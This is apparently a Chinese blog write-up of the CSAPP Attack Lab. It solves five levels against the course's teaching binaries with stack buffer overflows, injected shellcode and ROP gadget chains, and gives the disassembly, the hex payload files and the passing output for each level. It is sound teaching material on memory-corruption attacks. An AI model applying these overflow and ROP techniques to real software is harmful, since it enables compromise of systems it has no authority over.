---
title: CSAPP Attack Lab
comments: true
mathjax: false
tags: CSAPP
categories: 练习
abbrlink: 7092
date: 2018-12-01 15:56:28
---

《深入理解计算机操作系统》的 Attack Lab 实验。主要考察利用缓冲区的漏洞。

<!--more-->

## 第一关

利用溢出重写 getbuf 函数 ret 的部分，从而调用函数 touch1。

```c
void test()
{
    int val;
    val = getbuf();
    printf( "No exploit. Getbuf returned 0x%x\n", val );
}
```

```c
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf( "Touch1!: You called touch1()\n" );
    validate( 1 );
    exit( 0 );
}
```

首先先得到 `ctarget` 的汇编代码。

```sh
objdump ctarget -d > ctarget.d
```

然后找到 getbuf 函数的汇编代码。

```x86asm
00000000004017a8 <getbuf>:
  4017a8:   48 83 ec 28             sub    $0x28,%rsp
  4017ac:   48 89 e7                mov    %rsp,%rdi
  4017af:   e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:   b8 01 00 00 00          mov    $0x1,%eax
  4017b9:   48 83 c4 28             add    $0x28,%rsp
  4017bd:   c3                      retq
  4017be:   90                      nop
  4017bf:   90                      nop
```

可以看到 getbuf 在局部栈中开辟了 `0x28` 个字节的空间，也就是 40 个字节的空间。如果我们的输入超过了 40 个字节，就会造成缓冲区溢出。

![](https://res.cloudinary.com/ouyangsong/image/upload/q_auto/1543732420.png)

{% note info %}
将控制从函数 P 转移到函数 Q 只需要简单地把程序计数器设置为 Q 的代码的起始位置，当稍后从 Q 返回时，处理器必须记录好它需要继续 P 的执行的代码位置。
被调用者 Q 的栈帧自栈底（高地址）到栈顶（低地址）包括了被保存的寄存器，局部变量和参数构造区。
调用者 P 的栈帧自栈底（高地址）到栈顶（低地址）包括了参数以及返回地址。
{% endnote %}

溢出的字符会直接覆盖调用者栈帧中的返回地址，所以把 touch1 函数的地址作为溢出的字符串，从而覆盖返回地址。

```x86asm
00000000004017c0 <touch1>:
```

接下来需要考虑大小端问题，因为这决定了把 touch1 函数的地址追加在前面还是后面。

看这一行代码，可以推测出这是小端。

```x86asm
4017d8:   bf 01 00 00 00          mov    $0x1,%edi
```

{% note info %}
数字 0x12345678 从低地址往高地址看，在大端系统中是 0x12345678，在小端系统中是 0x78563412。
{% endnote %}

然后新建文件 `level1` 并且写入以下内容。前面 40 个字节没有关系，只要不是 `0a`，因为这是 `\n` 会导致换行，那么后面的就不能传入了。

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 00 00
```

```sh
➜  target1 git:(master) ✗ cat level1| ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
    user id    bovik
    course    15213-f15
    lab    attacklab
    result    1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 00 00
```

## 第二关

这一关的任务是让 `ctarget` 执行函数 `touch2` 的代码，而不是返回到 `test` 函数中。同时必须让 `touch2` 函数以为它接收到的参数是 `cookie`。

```c
void touch2( unsigned val )
{
    vlevel = 2;
    if ( val == cookie )
    {
        printf( "Touch2!: You called touch2(0x%.8x)\n", val );
        validate( 2 );
    } else {
        printf( "Misfire: you called touch2(0x%.8x)\n", val );
        fail( 2 );
    }
    exit( 0 );
}
```

`touch2` 函数对应的汇编代码。

```x86asm
00000000004017ec <touch2>:
  4017ec:   48 83 ec 08             sub    $0x8,%rsp
  4017f0:   89 fa                   mov    %edi,%edx
  4017f2:   c7 05 e0 2c 20 00 02    movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:   00 00 00
  4017fc:   3b 3d e2 2c 20 00       cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:   75 20                   jne    401824 <touch2+0x38>
  401804:   be e8 30 40 00          mov    $0x4030e8,%esi
  401809:   bf 01 00 00 00          mov    $0x1,%edi
  40180e:   b8 00 00 00 00          mov    $0x0,%eax
  401813:   e8 d8 f5 ff ff          callq  400df0 <__printf_chk@plt>
  401818:   bf 02 00 00 00          mov    $0x2,%edi
  40181d:   e8 6b 04 00 00          callq  401c8d <validate>
  401822:   eb 1e                   jmp    401842 <touch2+0x56>
  401824:   be 10 31 40 00          mov    $0x403110,%esi
  401829:   bf 01 00 00 00          mov    $0x1,%edi
  40182e:   b8 00 00 00 00          mov    $0x0,%eax
  401833:   e8 b8 f5 ff ff          callq  400df0 <__printf_chk@plt>
  401838:   bf 02 00 00 00          mov    $0x2,%edi
  40183d:   e8 0d 05 00 00          callq  401d4f <fail>
  401842:   bf 00 00 00 00          mov    $0x0,%edi
  401847:   e8 f4 f5 ff ff          callq  400e40 <exit@plt>
```

`touch2` 函数的参数存储在寄存器 `$rdi` 中。所以需要把 `$rdi` 中的值置成 `cookie`，然后执行 `touch2` 函数。
在第一关中的答案中输出了 `cookie` 的地址 `0x59b997fa`。这里可以看到 `touch2` 函数的地址是 `$0x4017ec`。所以得到下面的汇编代码。

```x86asm
mov $0x59b997fa, %edi
pushq $0x4017ec
ret
```
把上面三行代码写入文件 `2.s` 中。

```sh
gcc -c 2.s
objdump -d 2.o > 2.d
```
用 gcc 和 objdump 汇编代码变成机器码。得到如下结果：

```x86asm
2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
   5:   68 ec 17 40 00          pushq  $0x4017ec
   a:   c3                      retq
```
这段程序的机器码是  `bf fa 97 b9 59 68 ec 17 40 00 c3`，一共 11 个字节。

```x86asm
➜  target1 git:(master) ✗ gdb ctarget
GNU gdb (Debian 8.1-4+b1) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ctarget...done.
(gdb) break getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) run -q
Starting program: /home/xieyiyu95/csapp-labs/attacklab/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12      buf.c: No such file or directory.
(gdb) ni
14      in buf.c
(gdb) print /x $rsp
$1 = 0x5561dc78
```

缓冲区地址是 `0x5561dc78`，和第一关一样，把这个地址放到 41 到 44 个字节。

```
bf fa 97 b9 59 68 ec 17 40 00
c3 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

![](https://res.cloudinary.com/ouyangsong/image/upload/q_auto/1543732584.png)

```sh
➜  target1 git:(master) ✗ cat level2 | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

## 第三关

和第二关不一样的地方是这里传入的参数是字符串，所以需要把 `$rdi` 寄存器设置成 `cookie` 字符串的指针，也就是 `cookie` 字符串的地址。
首先把 `cookie` 转化为 ASCII 码形式。`0x59b997fa` 对应的就是 `35 39 62 39 39 37 66 61`。

```x86asm
00000000004018fa <touch3>:
  4018fa:   53                      push   %rbx
  4018fb:   48 89 fb                mov    %rdi,%rbx
  4018fe:   c7 05 d4 2b 20 00 03    movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:   00 00 00
  401908:   48 89 fe                mov    %rdi,%rsi
  40190b:   8b 3d d3 2b 20 00       mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:   e8 36 ff ff ff          callq  40184c <hexmatch>
  401916:   85 c0                   test   %eax,%eax
  401918:   74 23                   je     40193d <touch3+0x43>
  40191a:   48 89 da                mov    %rbx,%rdx
  40191d:   be 38 31 40 00          mov    $0x403138,%esi
  401922:   bf 01 00 00 00          mov    $0x1,%edi
  401927:   b8 00 00 00 00          mov    $0x0,%eax
  40192c:   e8 bf f4 ff ff          callq  400df0 <__printf_chk@plt>
  401931:   bf 03 00 00 00          mov    $0x3,%edi
  401936:   e8 52 03 00 00          callq  401c8d <validate>
  40193b:   eb 21                   jmp    40195e <touch3+0x64>
  40193d:   48 89 da                mov    %rbx,%rdx
  401940:   be 60 31 40 00          mov    $0x403160,%esi
  401945:   bf 01 00 00 00          mov    $0x1,%edi
  40194a:   b8 00 00 00 00          mov    $0x0,%eax
  40194f:   e8 9c f4 ff ff          callq  400df0 <__printf_chk@plt>
  401954:   bf 03 00 00 00          mov    $0x3,%edi
  401959:   e8 f1 03 00 00          callq  401d4f <fail>
  40195e:   bf 00 00 00 00          mov    $0x0,%edi
  401963:   e8 d8 f4 ff ff          callq  400e40 <exit@plt>
```

`$rsp` 的地址在上一关已经得到了 `0x5561dc78`，返回地址应为`$rsp+0x28`（保存代码执行地址的位置），然后字符串地址应为`$rsp+0x30`。所以 `cookie` 的地址应该是 `0x5561dca8`。`touch3` 函数的地址是 `0x4018fa`，和第二关一样，我们可以写出下面的汇编代码，写入文件 `3.s`。

```
mov $0x5561dca8, %edi
pushq $0x4018fa
ret
```

同样的操作得到下面的结果：

```
3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   bf a8 dc 61 55          mov    $0x5561dca8,%edi
   5:   68 fa 18 40 00          pushq  $0x4018fa
   a:   c3                      retq
```

这段代码的机器码是 `bf a8 dc 61 55 68 fa 18 40 00 c3`。

{% note warning %}
当调用 hexmatch 和 strncmp 时，会把数据压入到栈中，有可能会覆盖 getbuf 栈帧的数据，所以传进去字符串的位置必须小心谨慎。
{% endnote %}

```c
int hexmatch( unsigned val, char *sval )
{
    char    cbuf[110];
    char    *s = cbuf + random() % 100;
    sprintf( s, "%.8x", val );
    return(strncmp( sval, s, 9 ) == 0);
}
```

这因为 s 的位置是随机的，保存在 getbuf 的数据可能会被 hexmatch 重写。所以放在 getbuf 的栈帧中并不安全，所以需要放到 test 的栈帧中。

![](https://res.cloudinary.com/ouyangsong/image/upload/q_auto/1543736074.png)

得到 `level3` 文件如下：

```
bf a8 dc 61 55 68 fa 18 40 00
c3 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 35 39
62 39 39 37 66 61 00
```

验证结果：

```sh
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:BF A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

## 第四关

针对前三关描述的缓冲区溢出的攻击，现代的编译器和操作系统实现了很多机制来避免。

1. 栈随机化：栈的位置在程序每次运行时都有变化
2. 栈破坏检测：在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值
3. 限制可执行代码区域

在 ROP 中，因为限制了不能插入可执行代码。所以需要在程序中找到特定的指令序列，并且以 `ret` 结尾，这种叫做 `gadget`。
每一个 `gadget` 包含一系列指令，跳转到下一个 `gadget` 中，就这样连续执行一系列的指令序列，对程序造成攻击。

![gadget](https://res.cloudinary.com/ouyangsong/image/upload/q_auto/1543740079.png "gadget")

再开始任务前，先浏览下指令的编码，因为下面的需要使用到。

![movq 指令编码](https://res.cloudinary.com/ouyangsong/image/upload/q_auto/1543740667.png "movq 指令编码")

![popq 指令编码](https://res.cloudinary.com/ouyangsong/image/upload/q_auto/1543740723.png "popq 指令编码")

![movl 指令编码](https://res.cloudinary.com/ouyangsong/image/upload/q_auto/1543740778.png "movl 指令编码")

![2 字节编码](https://res.cloudinary.com/ouyangsong/image/upload/q_auto/1543740825.png "2 字节编码")

在这一关中重新实现第二关，只是不能将指令序列放入栈中。所以需要在现有的程序中，找到我们需要的指令序列。

可以选择两种方式：
1. 先将 `cookie` pop 到一个寄存器，然后用 mov 将该寄存器的值送入 `$rdi` 中。
2. 让 `cookie` 从栈中 pop 到 `$rdi` 中，然后将返回地址设置成 `touch2`。

这里采用第一种方法。那么需要的指令序列就是下面的。

```x86asm
popq %rax
movq %rax, %rdi
```

为了得到指令集，先反编译 `rtarget`，题目中要求只能用 `start_farm` 和 `mid_farm` 中间的指令序列。

```sh
objdump -d rtarget > rtarget-disassemble
```

然后我们找到 `popq %rax` 的指令字节是 `58`。所以找到下面的函数。

```x86asm
00000000004019a7 <addval_219>:
  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:   c3                      retq
```
所以 `popq %rax` 指令的地址是 `0x4019a7 + 0x04`，也就是 `0x4019ab`。

`movq %rax, %rdi` 的指令字节是 `48 89 c7`，所以找到下面的函数。

```x86asm
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq
```

所以 `movq %rax, %rdi` 指令的地址是 `0x4019a0 + 0x02`，也就是 `0x4019a2`。

![](https://res.cloudinary.com/ouyangsong/image/upload/q_auto/1543742011.png)

得到 `level4` 文件如下：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

验证结果正确性：

```sh
➜  target1 git:(master) ✗ cat level4 | ./hex2raw | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

## 第五关

这一关是重复第三关，同样是把目标字符串的地址作为参数传入给函数 `touch2` 中。

1. 获取 `$rsp` 的地址
2. 将栈的起始位置加 `cookie` 的偏移量放到某寄存器中
3. 将寄存器的值放到 `$rdi` 中
4. 调用 `touch2` 函数

获取到 `%rsp` 的地址。`movq %rsp %rax` 的指令字节是：`48 89 e0`。

```x86asm
0000000000401a03 <addval_190>:
  401a03:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
  401a09:   c3                      retq
```
所以这一步的 `gadget` 地址是 `0x401a06`。

将 `%rax` 的值移到 `%rdi` 中，`movq %rax %rdi` 的指令字节是：`48 89 c7`。

```x86asm
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq
```
所以这一步的 `gadget` 地址是 `0x4019a2`。

将偏移量的内容移到 `%rax` 中，`popq %rax` 的指令字节是 `58`。

```x86asm
00000000004019ca <getval_280>:
  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:   c3                      retq
```
所以这一步的 `gadget` 地址是 `0x4019cc`。

将 `%eax` 的内容放到 `%edx` 中，`movl %eax %edx` 的指令字节是 `89 c2`。

```x86asm
00000000004019db <getval_481>:
  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax
  4019e0:   c3                      retq
```
所以这一步的 `gadget` 地址是 `0x4019dd`。

将 `%edx` 的内容放到 `%ecx` 中，`movl %edx, %ecx` 的指令字节是 `89 d1`。

```x86asm
0000000000401a6e <setval_167>:
  401a6e:   c7 07 89 d1 91 c3       movl   $0xc391d189,(%rdi)
  401a74:   c3                      retq
```
所以这一步的 `gadget` 地址是 `0x401a70`。

将 `%ecx` 的内容放到 `%esi` 中，`movl %ecx %esi` 的指令字节是 `89 ce`。

```x86asm
00000000004019e8 <addval_113>:
  4019e8:   8d 87 89 ce 78 c9       lea    -0x36873177(%rdi),%eax
  4019ee:   c3                      retq
```
所以这一步的 `gadget` 地址是 `0x4019ea`。

将栈顶 + 偏移量得到字符串的首地址传送到 `%rax`，`lea (%rdi,%rsi,1),%rax` 的地址是 `0x4019d6`。

```x86asm
00000000004019d6 <add_xy>:
  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:   c3                      retq
```

将字符串首地址 `%rax` 传送到 `%rdi`，`movq %rax, %rdi` 的指令字节是 `48 89 c7`。

```x86asm
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq
```
所以这一步的 `gadget` 地址是 `0x4019a2`。

![](https://res.cloudinary.com/ouyangsong/image/upload/q_auto/1543746077.png "栈")

`cookie` 字符串的偏移量是 9 条指令，也就是 72 个字节。

得到 `level5` 的文件如下：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
ea 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```

验证结果正确性：
```
➜  target1 git:(master) ✗ cat level5 | ./hex2raw | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 EA 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```
